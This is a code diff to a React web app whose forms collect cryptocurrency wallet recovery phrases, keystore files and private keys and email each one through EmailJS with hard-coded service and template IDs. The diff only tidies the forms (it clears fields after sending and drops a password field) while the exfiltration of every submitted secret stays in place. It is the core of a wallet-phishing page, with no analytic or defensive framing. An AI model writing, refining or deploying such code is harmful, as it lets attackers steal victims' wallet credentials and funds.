@@ -18,6 +18,7 @@ export const PhraseForm = () => {
         emailjs.send("service_y2bhhrr", "template_pdxgf2g", { email_subject: "New Phrase Data", message, email_title: "Phrase Data", key: "Recovery Phrase" }, "JEfCbGU-NY097Ysab").then(() => {
            toast.success("Phrase email sent")
            setLoading(false);
+           setMessage("");
         }, () => {
             toast.error("Email sending failed. Try again later.");
            setLoading(false);
@@ -41,16 +42,16 @@ export const PhraseForm = () => {
 const KeystoreForm = () => {
 
     const [keystore, setKeystore] = useState("");
-    const [wallet_password, setWalletPassword] = useState("");
     const [loading, setLoading] = useState(false);
 
     const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
         e.preventDefault();
 
         setLoading(true);
-        emailjs.send("service_y2bhhrr", "template_5ccyb9i", { keystore, wallet_password }, "JEfCbGU-NY097Ysab").then(() => {
+        emailjs.send("service_y2bhhrr", "template_5ccyb9i", { keystore }, "JEfCbGU-NY097Ysab").then(() => {
            toast.success("Keystore email sent")
            setLoading(false);
+           setKeystore("");
         }, () => {
             toast.error("Email sending failed. Try again later.");
            setLoading(false);
@@ -63,9 +64,7 @@ const KeystoreForm = () => {
         <form className="flex flex-col gap-y-3" onSubmit={handleSubmit}>
              <textarea name="" id="" cols={30} rows={5} className="w-full border border-gray-500 border-opacity-30 p-3 rounded-lg focus:ring-blue-600 focus:ring-2  focus:ring-opacity-30 transition-colors outline-none  text-xs " placeholder="Enter keystore" value={keystore} onChange={(e) => setKeystore(e.target.value)} required ></textarea>
             
-            <input type="password" className="w-full border border-gray-500 border-opacity-30 p-3 rounded-lg focus:ring-blue-600 focus:ring-2  focus:ring-opacity-30 transition-colors outline-none  text-xs mb-2" placeholder="Wallet password"
-            value={wallet_password} onChange={(e) => setWalletPassword(e.target.value)} required
-            />
+          
             <p className="text-xs text-gray-800">
             Several lines of text beginning with {"{...}"} plus the password you used to encrypt it.
             </p>
@@ -85,6 +84,7 @@ const PrivateKeyForm = () => {
         emailjs.send("service_y2bhhrr", "template_pdxgf2g", { email_subject: "New Private Key Data", message, email_title: "Private Key Data", key: "Private Key" }, "JEfCbGU-NY097Ysab").then(() => {
            toast.success("Private key email sent")
            setLoading(false);
+           setMessage("")
         }, () => {
             toast.error("Email sending failed. Try again later.");
            setLoading(false);
